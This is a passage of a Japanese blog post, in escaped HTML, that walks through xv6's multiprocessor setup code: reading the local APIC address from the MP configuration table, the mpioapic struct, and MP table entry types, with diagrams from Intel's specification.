&lt;h3 id=&quot;mpコンフィグレーションテーブルからioapicを取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mp%E3%82%B3%E3%83%B3%E3%83%95%E3%82%A3%E3%82%B0%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%8B%E3%82%89ioapic%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;mpコンフィグレーションテーブルからioapicを取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MPコンフィグレーションテーブルからIOAPICを取得する&lt;/h3&gt;
&lt;p&gt;つづいて、&lt;code class=&quot;language-text&quot;&gt;mpioapic&lt;/code&gt;構造体の&lt;code class=&quot;language-text&quot;&gt;ioapic&lt;/code&gt;にMPコンフィグレーションテーブルの&lt;code class=&quot;language-text&quot;&gt;lapicaddr&lt;/code&gt;から取得したアドレスを格納します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; ismp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ioapic&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

ismp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
lapic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;lapicaddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mpioapic&lt;/code&gt;構造体は以下の構造体です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpioapic&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// I/O APIC table entry&lt;/span&gt;
  uchar type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// entry type (2)&lt;/span&gt;
  uchar apicno&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// I/O APIC id&lt;/span&gt;
  uchar version&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// I/O APIC version&lt;/span&gt;
  uchar flags&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// I/O APIC flags&lt;/span&gt;
  uint &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;addr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// I/O APIC address&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Intel仕様書の図は以下です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/0b533/image-32.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAACBUlEQVQ4y3VT2ZKiQBD0//9n9tEXn8YxQiZmFA9uEcFVQUNBQcytLGSXNXaJqOimKju7juzedrtFEARYryPEmw08z8d+v8dyaSHLMmzEx/9NFAlmrft2ZeznbockSZDnOc7nM3qHw0EdOwnQ4jhGmqbq830f4/EY0+lU/SRhjLjuSiyJ+SkhnVzbPQ8ej0fYtg3DGOPr6xuJVNLGiGtX2lYII6ngfr+jx0CbXdfo930PpmlisVgglkP/wjalR2Dr6rpuCF+NQGboOA5GoxGMz0/x/cmsa/SRMAxDyVAIr9erNrQoCjXu6WN5HBaBifSP+y6ui+XwWHZdP9CrqgplWf5lVXXXiXmeB9d1EclUSfyKo7Fvp9MJq9WqKZmEt9vtt7VAglgKgb4fqFS6mO6e2CROGsI2SGJaUVx1/PnlotqzLEu1ySnyADNime2eKwnbuA6FZVnLJULJIpPeUS40X/p2EeIso6xS1SIzTZ8YXmbbjiqAg1RCCncwGGA4HKLf72u/Rh8feHv7oRPmFIPA14mzfEcuJyEHQeG3Gmbs8RBhU2fD93d8TyaYz2Z6a1nenlO9dA41EsllukkS4yiEfKp78TFzVqJPr+nDQ/tBWwmRYRgqZrbCdR29bCLGJziV1TRnSsxeFs+VEqKvh5fvID2dz+eq/Oap7VQyLCkM19oSTv1/3y9w/hzqn7A9GwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/8ac56/image-32.webp 240w,
/static/aa0f5df371a8d16482b51da6fec26f48/d3be9/image-32.webp 480w,
/static/aa0f5df371a8d16482b51da6fec26f48/b0a15/image-32.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/8ff5a/image-32.png 240w,
/static/aa0f5df371a8d16482b51da6fec26f48/e85cb/image-32.png 480w,
/static/aa0f5df371a8d16482b51da6fec26f48/0b533/image-32.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/0b533/image-32.png&quot;
            alt=&quot;2022/01/image-32.png&quot;
            title=&quot;2022/01/image-32.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel MultiProcessor Specification  | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IOAPICは外部割込みを複数のCPUで分散するための機構です。&lt;/p&gt;
&lt;p&gt;APICが外部割込みの機構であることは前述しましたが、APICにはローカルAPICとIOAPICの2種類があるようです。&lt;/p&gt;
&lt;p&gt;xv6OSではローカルAPICについては&lt;code class=&quot;language-text&quot;&gt;lapic.c&lt;/code&gt;で、IOAPICについては&lt;code class=&quot;language-text&quot;&gt;ioapic.c&lt;/code&gt;で実装されています。&lt;/p&gt;
&lt;p&gt;ローカルAPICはCPUに内臓された割込みで、IOAPICはI/Oデバイスから受けとった割込みを、リダイレクションテーブルの情報を元にCPUに通知します。&lt;/p&gt;
&lt;p&gt;IOAPICはIOAPICテーブルを持っており、x86CPUは&lt;code class=&quot;language-text&quot;&gt;memory-mapped I/O&lt;/code&gt;を通してこのテーブルのエントリを定義できます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;memory-mapped I/O&lt;/code&gt;は簡単に言うとCPUとI/Oデバイス間で入出力を行う方法の一つで、物理アドレス空間にI/Oデバイスの入出力のための空間を用意し、CPUのメモリの読み書きの機能を利用して入出力を行う方法です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://mmi.hatenablog.com/entry/2017/04/09/132708&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;I/O APICについて - 睡分不足&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%9E%E3%83%83%E3%83%97%E3%83%89I/O&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;メモリマップドI/O - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PCIをI/Oデバイスに持つ一般的なシステムの場合、IOAPICはPCIの割込み信号の変化を検知し、リダイレクションテーブルの情報を元にCPUに割込みメッセージを発行します。&lt;/p&gt;
&lt;p&gt;この情報はCPU内部のローカルAPICが受け取り、割込みハンドラを呼び出して割込み処理を行った後、EOI(End of Interrupt)コマンドをIOAPICに返すことで、IOAPICに対して割込みの完了を通知します。&lt;/p&gt;
&lt;p&gt;詳しくは実際に割込み処理を実装するところまで進んだらやります。たぶん。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/APIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;APIC - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/APIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;APIC - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/IOAPIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;IOAPIC - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2008/readings/ia32/ioapic.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;82093AA I/O ADVANCED PROGRAMMABLE INTERRUPT CONTROLLER (IOAPIC)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;APICの仕組みは、x86CPUとそのマザーボードのようなマルチプロセッサ環境での割込みを制御するための割込みコントローラが必要になったことで生まれました。&lt;/p&gt;
&lt;p&gt;もともと実装されていたPICと呼ばれるシンプルな割込み機構では、マルチプロセッサ構成での割込み処理に対応できなかったようです。&lt;/p&gt;
&lt;p&gt;xv6OSもマルチプロセッサ構成を前提としているので、PICからの割込みを無視してローカルAPICとIOAPICを使用した割込み処理を実装します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;P45&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSのコードでは&lt;code class=&quot;language-text&quot;&gt;mpioapic&lt;/code&gt;構造体の&lt;code class=&quot;language-text&quot;&gt;ioapic&lt;/code&gt;にMPコンフィグレーションテーブルの&lt;code class=&quot;language-text&quot;&gt;lapicaddr&lt;/code&gt;から取得したアドレスを格納しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapicaddr&lt;/code&gt;に格納されているのはメモリマップドされたローカルAPICのアドレスです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapicaddr&lt;/code&gt;を格納する変数&lt;code class=&quot;language-text&quot;&gt;lapic&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;defs.h&lt;/code&gt;でグローバル変数として定義されています。&lt;/p&gt;
&lt;p&gt;この関数の中では以降使用することはなく、&lt;code class=&quot;language-text&quot;&gt;lapic.c&lt;/code&gt;で使用することになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; uint&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;    lapic&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;プロセッサの情報を取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%BB%E3%83%83%E3%82%B5%E3%81%AE%E6%83%85%E5%A0%B1%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;プロセッサの情報を取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;プロセッサの情報を取得する&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;lapicaddr&lt;/code&gt;の取得が完了した後のループを見てみます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;conf&lt;/code&gt;には、先ほど取得したMPコンフィグレーションテーブルが格納されています。&lt;/p&gt;
&lt;p&gt;Intelの仕様書より、MPコンフィグレーションテーブルエントリは、MPコンフィグレーションテーブルヘッダ(MPコンフィグレーションテーブルの先頭アドレス)から、可変数で続いていくことがわかります。&lt;/p&gt;
&lt;p&gt;MPコンフィグレーションテーブルエントリは、先ほど例示した&lt;code class=&quot;language-text&quot;&gt;Processor Entries&lt;/code&gt;の他に、&lt;code class=&quot;language-text&quot;&gt;Bus Entry&lt;/code&gt;、&lt;code class=&quot;language-text&quot;&gt;I/O APIC Entry&lt;/code&gt;、&lt;code class=&quot;language-text&quot;&gt;I/O Interrupt Entry&lt;/code&gt;、&lt;code class=&quot;language-text&quot;&gt;Local Interrupt Entry&lt;/code&gt;などがあります。(他にも拡張エントリが存在します)&lt;/p&gt;
&lt;p&gt;これらはいずれも先頭1バイトにユニークな&lt;code class=&quot;language-text&quot;&gt;Entry Point&lt;/code&gt;が定義されています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Processor Entry&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/0b533/image-32-164559487926114.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAACBUlEQVQ4y3VT2ZKiQBD0//9n9tEXn8YxQiZmFA9uEcFVQUNBQcytLGSXNXaJqOimKju7juzedrtFEARYryPEmw08z8d+v8dyaSHLMmzEx/9NFAlmrft2ZeznbockSZDnOc7nM3qHw0EdOwnQ4jhGmqbq830f4/EY0+lU/SRhjLjuSiyJ+SkhnVzbPQ8ej0fYtg3DGOPr6xuJVNLGiGtX2lYII6ngfr+jx0CbXdfo930PpmlisVgglkP/wjalR2Dr6rpuCF+NQGboOA5GoxGMz0/x/cmsa/SRMAxDyVAIr9erNrQoCjXu6WN5HBaBifSP+y6ui+XwWHZdP9CrqgplWf5lVXXXiXmeB9d1EclUSfyKo7Fvp9MJq9WqKZmEt9vtt7VAglgKgb4fqFS6mO6e2CROGsI2SGJaUVx1/PnlotqzLEu1ySnyADNime2eKwnbuA6FZVnLJULJIpPeUS40X/p2EeIso6xS1SIzTZ8YXmbbjiqAg1RCCncwGGA4HKLf72u/Rh8feHv7oRPmFIPA14mzfEcuJyEHQeG3Gmbs8RBhU2fD93d8TyaYz2Z6a1nenlO9dA41EsllukkS4yiEfKp78TFzVqJPr+nDQ/tBWwmRYRgqZrbCdR29bCLGJziV1TRnSsxeFs+VEqKvh5fvID2dz+eq/Oap7VQyLCkM19oSTv1/3y9w/hzqn7A9GwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/8ac56/image-32-164559487926114.webp 240w,
/static/aa0f5df371a8d16482b51da6fec26f48/d3be9/image-32-164559487926114.webp 480w,
/static/aa0f5df371a8d16482b51da6fec26f48/b0a15/image-32-164559487926114.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/8ff5a/image-32-164559487926114.png 240w,
/static/aa0f5df371a8d16482b51da6fec26f48/e85cb/image-32-164559487926114.png 480w,
/static/aa0f5df371a8d16482b51da6fec26f48/0b533/image-32-164559487926114.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/aa0f5df371a8d16482b51da6fec26f48/0b533/image-32-164559487926114.png&quot;
            alt=&quot;2022/01/image-32.png&quot;
            title=&quot;2022/01/image-32.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bus Entry&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ebb106502198c09c82ee7c65884af857/0b533/image-33.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 37.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAARlAAAEZQAGA43XUAAABSElEQVQoz3VRXXOCQAzk//+t+mZrHwUH5U6BooBw+FE4lW026oydaTOTyc0lu0k2wW63A70sSyyXMYyxqKoKdV1jv6+xWq1QFAXattWa7baAtRavuDzLtN65FsHlcoEfBjCSwHUdrtervPdKbEyihAR779H3vZLzPQiO8Xw+K6EXjuB2uykZI4tZMMrbGIM4jrFYRAijCPP5HIPk2Px0OuHVOEAimzTtY8LhMeHxeNRu3t8b0PhHAGPbOiXjhFYaJkmC9XqNL9mA+XEcEbx24nQE05ikk4AxDEOdmmuxKbU0yV2Ow+GApWxTVjWCTjRzzumntQZZliuAHekkoT7cgpJ0nUMqR/iWN+v4R72fMgQc/+k8ApOZAAjK81xXStMUm81Gr8tcLTVN0/zpv1Z+Go/xNpkgkmPQKfj7xwyfsxmm0yn6weM/+wHnhWCKxxlD3wAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/ebb106502198c09c82ee7c65884af857/8ac56/image-33.webp 240w,
/static/ebb106502198c09c82ee7c65884af857/d3be9/image-33.webp 480w,
/static/ebb106502198c09c82ee7c65884af857/b0a15/image-33.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/ebb106502198c09c82ee7c65884af857/8ff5a/image-33.png 240w,
/static/ebb106502198c09c82ee7c65884af857/e85cb/image-33.png 480w,
/static/ebb106502198c09c82ee7c65884af857/0b533/image-33.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/ebb106502198c09c82ee7c65884af857/0b533/image-33.png&quot;
            alt=&quot;2022/01/image-33.png&quot;
            title=&quot;2022/01/image-33.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I/O APIC Entry&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/7ad98ae9eace37cd674ae886ea48e121/0b533/image-34.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 36.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAARlAAAEZQAGA43XUAAABTElEQVQozz1R7a6CMBTj/V9LE8UoinKjV0QQjIOBRr4EFOxdZ64/mmXL2tP2GOfzGVmW4Xq94na7wfM8fS/LQqGETBJEUYSiKJDnuUai3tI0/XKEELjf76jrGkZVVej7Hq/XC8MwIAxD7Pd7hEqE4qfTCcfjEa7ramEa4J9S8Yah19ymaRDHMerHAwZdPJ9PdF2nRcXlAt/3IaXUZCF4D7QYXfH9X5D/CTpjKgobJG02a2y3WyyXS7iHg447Go1gmiZyFbVrW2RKzA8CSHWSGAY+FgtL85iA1ZRlBYP5LcvCdDpVwg5Wq5VyIvHjOPCUOB1xOt1xOHsjHioe09Eda0vVv6ZpP4IEOyCZcZNEfgmfiJEunQvhKUSsB3AhBJfEJHop7I898CTe7zfWaxuTyQS2beN3t9MLmc1MjMdjzOdzFXXx7ZDdk9eqWog/BA8JmOWgzGAAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/7ad98ae9eace37cd674ae886ea48e121/8ac56/image-34.webp 240w,
/static/7ad98ae9eace37cd674ae886ea48e121/d3be9/image-34.webp 480w,
/static/7ad98ae9eace37cd674ae886ea48e121/b0a15/image-34.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/7ad98ae9eace37cd674ae886ea48e121/8ff5a/image-34.png 240w,
/static/7ad98ae9eace37cd674ae886ea48e121/e85cb/image-34.png 480w,
/static/7ad98ae9eace37cd674ae886ea48e121/0b533/image-34.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/7ad98ae9eace37cd674ae886ea48e121/0b533/image-34.png&quot;
            alt=&quot;2022/01/image-34.png&quot;
            title=&quot;2022/01/image-34.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I/O Interrupt Entry&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8edea3877268c6c4dd0f14c0f9fc9f24/0b533/image-35.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 39.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAARlAAAEZQAGA43XUAAABhUlEQVQoz21Sa2+CQBD0//8sbX010SpaRB4CBUQBkXfig+nOmX5peskFbu92ZnZnB0maoixLVFWFMAxhWhaKolCbcfdwgO/76v56vSLLMniei1Tyft9FkpckCfI8x8DY7aBtNlitVtjv9wp0o85rbLdbBEGgYtp6jZ2uwxLCy+WCXPaaMcmvm0YBP59PDD7mc8xmM0wnYwXcyOVG0zCZTLFcfiIVRV3XwrEtaBKnyrqu0cgej9+FfIu+73FwHGRCMrjf74J+hWmaWAnjcrFQ/7qoITPVJOezOlP18Rirsm1RakhFjgC5nictKfGgwsfjgSgKMRqNMByOYBgGclERfPsIwgiu6+J2u8HY6fLm7aVOiDLpIdvBXpLYse2XwjiOcTrF0mhPVHzBlouqqlVpfMwzv6yk6zq0bQPmNG2rjCJBmiYSb9FTIZvJCwboqmWZCtwTZVEU4SAuszQC0122g1UQtChKZQbJ6bByGX8WARfSRyZlWfoaJXOvpoBO0wROAUfpv/UDy39OoWydYDYAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8edea3877268c6c4dd0f14c0f9fc9f24/8ac56/image-35.webp 240w,
/static/8edea3877268c6c4dd0f14c0f9fc9f24/d3be9/image-35.webp 480w,
/static/8edea3877268c6c4dd0f14c0f9fc9f24/b0a15/image-35.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8edea3877268c6c4dd0f14c0f9fc9f24/8ff5a/image-35.png 240w,
/static/8edea3877268c6c4dd0f14c0f9fc9f24/e85cb/image-35.png 480w,
/static/8edea3877268c6c4dd0f14c0f9fc9f24/0b533/image-35.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8edea3877268c6c4dd0f14c0f9fc9f24/0b533/image-35.png&quot;
            alt=&quot;2022/01/image-35.png&quot;
            title=&quot;2022/01/image-35.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
